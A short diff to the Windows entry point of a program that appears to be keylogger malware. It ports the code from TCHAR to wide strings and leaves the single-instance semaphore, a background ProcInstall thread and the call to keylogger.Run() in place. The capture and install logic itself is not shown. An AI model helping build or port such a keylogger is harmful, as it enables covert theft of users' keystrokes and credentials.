@@ -13,13 +13,13 @@ DWORD WINAPI ProcInstall(LPVOID lpParameter)
 	return 0;
 }
 
-extern "C" int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
+extern "C" int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
 {
-	TCHAR semName[] = V_UNIQUE_ID;
+	wchar_t semName[] = V_UNIQUE_ID;
 	HANDLE hSem = CreateSemaphore(NULL, 1, 1, semName);
 	if (WaitForSingleObject(hSem, 0) == WAIT_TIMEOUT)
 	{
-		VLog(LMESSAGE, "Already running");
+		VLog(LMESSAGE, L"Already running");
 		CloseHandle(hSem);
 		return 0;
 	}
@@ -33,7 +33,7 @@ extern "C" int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
 	CreateThread(NULL, 0xFFFF, ProcInstall, NULL, 0, NULL);
 #endif
 
-	VLog(LMESSAGE, "Started");
+	VLog(LMESSAGE, L"Started");
 	keylogger.Run();
 
 	CloseHandle(hSem);
